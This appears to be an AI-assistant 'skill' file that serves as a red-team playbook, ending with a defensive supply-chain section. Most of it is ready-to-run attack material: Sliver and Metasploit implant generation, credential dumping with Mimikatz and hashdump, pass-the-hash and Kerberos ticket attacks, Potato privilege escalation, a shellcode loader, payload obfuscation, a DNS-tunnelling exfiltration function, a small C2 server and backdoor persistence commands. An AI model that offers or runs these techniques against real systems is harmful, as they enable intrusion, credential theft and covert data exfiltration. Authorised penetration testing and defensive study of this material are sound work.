---
name: red-team
description: Red team attack techniques. PoC development, C2 frameworks, lateral movement, privilege escalation, evasion techniques. Use when the user mentions red team, PoC, C2, lateral movement, PTH, evasion, Cobalt Strike, Sliver, or privilege escalation.
---

# 🔥 Scarlet Tome · Red Team (Red Team)


## Kill Chain

```
Reconnaissance → Weaponization → Delivery → Exploitation → Installation → C2 → Actions
      │               │             │             │              │         │        │
      └─ OSINT ───────┴─ PoC ───────┴─ Phishing ──┴─ PrivEsc ────┴─ Persist┴─ Lateral
```

## PoC Development

### Standard PoC Structure
```python
#!/usr/bin/env python3
"""
Vulnerability Name: CVE-XXXX-XXXX
Affected Versions: x.x.x - x.x.x
Vulnerability Type: RCE/SQLi/XSS/SSRF
"""
import requests
import argparse

class POC:
    def __init__(self, target: str):
        self.target = target.rstrip('/')
        self.session = requests.Session()
        self.session.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
        }

    def check(self) -> bool:
        """Harmless detection"""
        try:
            # Verify using harmless methods like delays, DNS out-of-band, etc.
            pass
        except Exception as e:
            return False

    def exploit(self, cmd: str) -> str:
        """Vulnerability exploitation"""
        pass

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('-u', '--url', required=True)
    parser.add_argument('-c', '--cmd', default='id')
    args = parser.parse_args()

    poc = POC(args.url)
    if poc.check():
        print(f"[+] Vulnerable!")
        print(poc.exploit(args.cmd))
    else:
        print("[-] Not vulnerable")

if __name__ == '__main__':
    main()
```

## C2 Frameworks

### Sliver (Recommended Open-source)
```bash
# Install
curl https://sliver.sh/install | sudo bash

# Generate Implant
sliver > generate --mtls 192.168.1.100 --os windows --save implant.exe
sliver > generate --http 192.168.1.100 --os linux --save implant

# Start Listener
sliver > mtls --lhost 0.0.0.0 --lport 8888
sliver > http --lhost 0.0.0.0 --lport 80

# Session Operations
sliver > sessions
sliver > use SESSION_ID
sliver (SESSION) > shell
sliver (SESSION) > download /etc/passwd
sliver (SESSION) > upload local remote
```

### Metasploit
```bash
# Generate Payload
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe > shell.exe

# Listen
msf6 > use exploit/multi/handler
msf6 > set payload windows/x64/meterpreter/reverse_tcp
msf6 > set LHOST 0.0.0.0
msf6 > run

# Meterpreter
meterpreter > getsystem
meterpreter > hashdump
meterpreter > load kiwi
meterpreter > creds_all
```

### Simple HTTP C2
```python
# Server
from flask import Flask, request, jsonify
import base64

app = Flask(__name__)
agents, tasks = {}, {}

@app.route('/beacon/<agent_id>')
def beacon(agent_id):
    if tasks.get(agent_id):
        return jsonify({"task": tasks[agent_id].pop(0)})
    return jsonify({"task": None})

@app.route('/result/<agent_id>', methods=['POST'])
def result(agent_id):
    output = base64.b64decode(request.json['output']).decode()
    print(f"[{agent_id}] {output}")
    return jsonify({"status": "ok"})
```

## Lateral Movement

### Pass-the-Hash (PTH)
```bash
# Impacket
psexec.py -hashes :NTLM_HASH administrator@TARGET
wmiexec.py -hashes :NTLM_HASH administrator@TARGET
smbexec.py -hashes :NTLM_HASH administrator@TARGET

# CrackMapExec
crackmapexec smb TARGET -u admin -H HASH -x "whoami"
crackmapexec smb 192.168.1.0/24 -u admin -H HASH --shares

# Mimikatz
sekurlsa::pth /user:admin /domain:DOMAIN /ntlm:HASH /run:cmd.exe
```

### Pass-the-Ticket (PTT)
```bash
# Export Tickets
mimikatz # sekurlsa::tickets /export

# Inject Ticket
mimikatz # kerberos::ptt ticket.kirbi

# Rubeus
Rubeus.exe ptt /ticket:ticket.kirbi
```

### Kerberos Attacks
```bash
# Kerberoasting
GetUserSPNs.py DOMAIN/user:pass -dc-ip DC_IP -request

# AS-REP Roasting
GetNPUsers.py DOMAIN/ -usersfile users.txt -dc-ip DC_IP

# Golden Ticket
mimikatz # kerberos::golden /user:admin /domain:DOMAIN /sid:S-1-5-21-xxx /krbtgt:HASH /ptt
```

### Remote Execution Methods
```bash
# WinRM
evil-winrm -i TARGET -u user -H HASH

# PowerShell Remoting
Enter-PSSession -ComputerName TARGET -Credential DOMAIN\user
Invoke-Command -ComputerName TARGET -ScriptBlock {whoami}

# WMI
wmic /node:TARGET /user:admin /password:pass process call create "cmd.exe /c whoami"
```

## Privilege Escalation

### Windows Privilege Escalation
```powershell
# Information Gathering
whoami /priv
systeminfo
net user
net localgroup administrators

# Common Privilege Escalation Paths
- SeImpersonatePrivilege → Potato series
- Service misconfiguration → Service path hijacking
- Scheduled tasks → Task hijacking
- AlwaysInstallElevated → MSI privilege escalation
- Unpatched → Kernel vulnerabilities

# Potato Privilege Escalation
JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -t *
PrintSpoofer.exe -i -c cmd
GodPotato.exe -cmd "cmd /c whoami"
```

### Linux Privilege Escalation
```bash
# Information Gathering
id
uname -a
cat /etc/passwd
sudo -l
find / -perm -4000 2>/dev/null

# Common Privilege Escalation Paths
- SUID binaries → GTFOBins
- sudo misconfiguration → sudo privilege escalation
- Kernel vulnerabilities → DirtyPipe/DirtyCow
- Cron jobs → cron hijacking
- Container escapes → Docker/K8s

# SUID Exploitation
find / -perm -4000 2>/dev/null
# Check GTFOBins: https://gtfobins.github.io/
```

## Evasion Techniques

### Basic Evasion
```python
# 1. String Obfuscation
import base64
payload = base64.b64encode(b"malicious_code").decode()
exec(base64.b64decode(payload))

# 2. Dynamic Loading
import importlib
module = importlib.import_module("os")
getattr(module, "system")("whoami")

# 3. Encrypted Payload
from Crypto.Cipher import AES
# Decrypt and execute at runtime
```

### Shellcode Loading
```python
import ctypes

shellcode = b"\xfc\x48\x83..."  # Generated by msfvenom

# Windows
ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_void_p
ptr = ctypes.windll.kernel32.VirtualAlloc(0, len(shellcode), 0x3000, 0x40)
ctypes.windll.kernel32.RtlMoveMemory(ptr, shellcode, len(shellcode))
ctypes.windll.kernel32.CreateThread(0, 0, ptr, 0, 0, 0)
```

### Covert Communication
```python
# DNS Tunneling
def dns_exfil(data, domain):
    encoded = base64.b32encode(data.encode()).decode()
    for chunk in [encoded[i:i+63] for i in range(0, len(encoded), 63)]:
        dns.resolver.resolve(f"{chunk}.{domain}", 'A')

# Domain Fronting
def domain_fronting(real_host, cdn_domain, data):
    headers = {"Host": real_host}
    requests.post(f"https://{cdn_domain}/api", json=data, headers=headers)
```

## Persistence

### Windows
```powershell
# Registry
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Update" /t REG_SZ /d "C:\backdoor.exe"

# Scheduled Tasks
schtasks /create /tn "Update" /tr "C:\backdoor.exe" /sc onlogon

# Services
sc create backdoor binPath= "C:\backdoor.exe" start= auto

# WMI Event Subscriptions
# Triggered on process start
```

### Linux
```bash
# Crontab
echo "* * * * * /tmp/backdoor" >> /var/spool/cron/root

# SSH Keys
echo "ssh-rsa AAAA..." >> /home/thangtn/.ssh/authorized_keys

# Services
# Create systemd service

# LD_PRELOAD
echo "/tmp/evil.so" >> /etc/ld.so.preload
```

## Tool Checklist

| Tool | Purpose |
|------|---------|
| Sliver | Open-source C2 Framework |
| Metasploit | Penetration Testing Framework |
| Cobalt Strike | Commercial C2 |
| Impacket | Windows Protocol Tools |
| CrackMapExec | Batch Lateral Movement |
| Mimikatz | Credential Extraction |
| Rubeus | Kerberos Tools |
| BloodHound | AD Path Analysis |

## Supply Chain Security

### Supply Chain Attack Vectors
```
Source Code → Build → Artifact → Distribution → Deployment → Runtime
     │          │        │            │             │           │
 Poisoning   Tampering Backdoor    Hijacking     PrivEsc     Lateral
```

| Phase | Attack Method | Example |
|-------|---------------|---------|
| Source Code | Dependency poisoning | event-stream, ua-parser-js |
| Build | CI/CD hijacking | SolarWinds, CodeCov |
| Artifact | Malicious packages | PyPI/npm typosquatting |
| Deployment | Configuration tampering | K8s YAML injection |
| Runtime | Container escapes | Privileged containers, kernel vulnerabilities |

### SBOM + Dependency Scanning
```bash
# Generate SBOM (Syft)
syft nginx:latest -o cyclonedx-json > sbom.json

# Vulnerability Scanning (Trivy)
trivy image --severity HIGH,CRITICAL nginx:latest
trivy fs --scanners vuln,secret,misconfig .

# Dependency Scanning (Grype)
grype sbom:./sbom.json
```

### Signature Verification (Sigstore/Cosign)
```bash
cosign sign --key cosign.key myregistry/myapp:v1.0
cosign verify --key cosign.pub myregistry/myapp:v1.0
cosign attach sbom --sbom sbom.json myregistry/myapp:v1.0
cosign verify-attestation --key cosign.pub myregistry/myapp:v1.0
```

### SLSA Levels
```
Level 1: Documented build  Level 2: Tamper-proof + Authenticated source
Level 3: Security platform + Isolated build  Level 4: Two-party review + Hermetic build
```

### Supply Chain Security Checklist
```yaml
Source Code:
  - [ ] Branch protection + Code review + Dependency lock + Secret leak scanning
Build and Artifacts:
  - [ ] Hosted CI/CD + Isolated builds + SBOM generation + Artifact signing + Vulnerability scanning
Deployment and Runtime:
  - [ ] Verify signatures (Cosign/SLSA) + Admission control (Kyverno/OPA) + Runtime monitoring
```

---
